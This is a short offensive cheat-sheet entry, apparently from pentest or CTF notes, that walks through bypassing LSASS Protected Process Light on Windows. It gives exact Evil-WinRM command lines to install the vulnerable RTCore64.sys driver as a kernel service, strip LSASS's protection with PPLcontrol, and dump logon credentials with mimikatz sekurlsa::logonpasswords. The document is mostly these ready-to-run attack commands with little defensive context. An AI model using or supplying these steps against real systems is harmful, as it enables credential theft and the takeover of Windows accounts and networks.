# 15.20 PPL Bypass Credential Dumping on Protected LSASS

> Strip LSASS's PPL flag via `PPLcontrol` + the RTCore64.sys vulnerable driver, then dump with `mimikatz sekurlsa::logonpasswords`.

## Overview

Protected Process Light (PPL) prevents even SYSTEM from opening LSASS with standard handles. Bypass using PPLcontrol + a vulnerable signed driver (RTCore64.sys) to strip LSASS's PPL flag, then dump normally with mimikatz sekurlsa::logonpasswords.

## Steps

- Attempting mimikatz sekurlsa::logonpasswords on a PPL-protected system returns "Handle on memory" error.
- Load RTCore64.sys driver via sc.exe create + net start.
- PPLcontrol.exe list shows protected PIDs and their protection levels.
- PPLcontrol.exe unprotect <lsass-pid> removes PPL from LSASS.
- Run mimikatz sekurlsa::logonpasswords again to dump credentials successfully.

## Commands

### Create RTCore64 driver service

```powershell
*Evil-WinRM* PS C:\Users\svc_sql\Documents> sc.exe create RTCore64 type= kernel start= auto binPath= C:\Users\svc_sql\Documents\RTCore64.sys DisplayName= "control"
```

### Start driver

```powershell
*Evil-WinRM* PS C:\Users\svc_sql\Documents> net start RTCore64
```

### List protected processes

```powershell
*Evil-WinRM* PS C:\Users\svc_sql\Documents> .\PPLcontrol.exe list
```

### Unprotect LSASS

```powershell
*Evil-WinRM* PS C:\Users\svc_sql\Documents> .\PPLcontrol.exe unprotect 656
```

### Dump credentials after unprotect

```powershell
*Evil-WinRM* PS C:\Users\svc_sql\Documents> .\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
```
